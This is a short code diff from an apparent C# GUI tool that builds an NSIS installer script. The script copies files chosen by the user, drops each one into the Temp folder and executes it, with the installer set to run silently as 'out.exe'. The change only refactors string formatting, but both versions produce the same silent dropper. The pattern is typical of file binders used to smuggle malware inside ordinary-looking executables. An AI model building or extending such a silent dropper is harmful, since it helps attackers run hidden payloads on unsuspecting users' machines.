@@ -56,12 +56,11 @@ namespace GUI
 
                 for (int i = 0x0; i < listView1.Items.Count; i++)
                 {
-                    string _New_File_Name = listView1.Items[i].SubItems[0x0].Text.Remove(0x0, listView1.Items[i].SubItems[0x0].Text.LastIndexOf('\\') + 0x1).Replace(" ", string.Empty);
-                    string _New_Path = _Startup_Path + "\\" + _New_File_Name;
+                    string _New_Path = _Startup_Path + "\\" + listView1.Items[i].SubItems[0x0].Text.Remove(0x0, listView1.Items[i].SubItems[0x0].Text.LastIndexOf('\\') + 0x1).Replace(" ", string.Empty);
 
                     File.Copy(listView1.Items[i].SubItems[0x0].Text, _New_Path);
 
-                    _Files += string.Format("Section \"{0}\"\r\nSetOutPath \"${1}\"\r\nSetOverwrite on\r\nFile \"{2}\"\r\nExec ${3}\\{4}\r\nSectionEnd\r\n\r\n", "file" + i, "Temp", _New_Path, "Temp", _New_Path.Remove(0x0, _New_Path.LastIndexOf('\\') + 0x1));
+                    _Files += $"Section \"{"file" + i}\"\r\nSetOutPath \"${"Temp"}\"\r\nSetOverwrite on\r\nFile \"{_New_Path}\"\r\nExec ${"Temp"}\\{_New_Path.Remove(0x0, _New_Path.LastIndexOf('\\') + 0x1)}\r\nSectionEnd\r\n\r\n";
                 }
 
                 File.AppendAllText("source.txt", "OutFile \"out.exe\"\r\nSilentInstall silent\r\nRequestExecutionLevel user\r\n" + _Files);
